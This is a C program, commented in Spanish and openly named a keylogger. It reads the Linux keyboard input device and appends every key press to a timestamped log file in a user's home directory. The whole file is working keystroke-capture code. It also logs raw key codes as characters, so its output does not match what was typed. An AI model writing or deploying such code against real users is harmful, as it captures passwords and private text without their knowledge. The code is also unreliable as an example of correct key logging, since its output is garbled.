#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

// Función para obtener el nombre del archivo de log basado en la fecha y hora actuales
char* get_log_filename() {
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    static char filename[128];
    strftime(filename, 128, "/home/leonardo/Documentos/keylogger %d-%m-%Y_%H-%M.txt", tm_info);
    return filename;
}

// Función principal
int main() {
    // Obtener el nombre del archivo de log
    char* log_file = get_log_filename();

    // Ruta al dispositivo de teclado
    const char *device_path = "/dev/input/event1";

    // Intentar abrir el dispositivo
    int device = open(device_path, O_RDONLY);
    if (device == -1) {
        perror("No se pudo abrir el dispositivo de entrada");
        return EXIT_FAILURE;
    }

    // Estructura para almacenar eventos de entrada
    struct input_event ev;

    printf("Escuchando eventos en %s y registrando en %s\n", device_path, log_file);

    // Bucle para leer eventos del dispositivo
    while (1) {
        ssize_t bytes_read = read(device, &ev, sizeof(struct input_event));
        if (bytes_read > 0) {
            // Mensaje de depuración
            printf("Evento recibido: type=%d, code=%d, value=%d\n", ev.type, ev.code, ev.value);

            // Filtrar eventos de teclas presionadas
            if (ev.type == EV_KEY && ev.value == 1) {
                FILE *log_fp = fopen(log_file, "a");
                if (log_fp != NULL) {
                    printf("Archivo de log abierto: %s\n", log_file);  // Mensaje de depuración
                    if (ev.code == KEY_ENTER) {
                        fprintf(log_fp, "\n");
                    } else if (ev.code >= 0 && ev.code <= 255) {
                        fprintf(log_fp, "%c", ev.code);
                    }
                    fclose(log_fp);
                } else {
                    perror("No se pudo abrir el archivo de log");
                }
            }
        } else if (bytes_read == -1) {
            perror("Error al leer del dispositivo");
            close(device);
            return EXIT_FAILURE;
        }
    }

    // Cerrar el dispositivo
    close(device);

    return 0;
}